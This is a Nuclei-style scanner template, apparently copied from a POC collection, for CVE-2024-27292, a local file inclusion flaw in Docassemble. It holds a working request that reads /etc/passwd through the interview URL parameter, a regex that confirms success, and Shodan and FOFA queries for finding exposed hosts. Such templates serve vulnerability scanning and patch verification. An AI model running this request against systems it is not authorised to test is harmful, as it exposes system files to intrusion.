# CVE_2024_27292

from: https://github.com/wy876/POC/blob/main/Docassemble%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2024-27292).md

```
id: CVE-2024-27292

info:
  name: Docassemble - Local File Inclusion
  author: johnk3r
  severity: high
  description: |
    Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.
  reference:
    - https://tantosec.com/blog/docassemble/
    - https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv
    - https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-27292
    cwe-id: CWE-706
    epss-score: 0.00043
    epss-percentile: 0.0866
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"docassemble"
    fofa-query: icon_hash="-575790689"
  tags: cve,cve2024,docassemble,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/interview?i=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 501
```
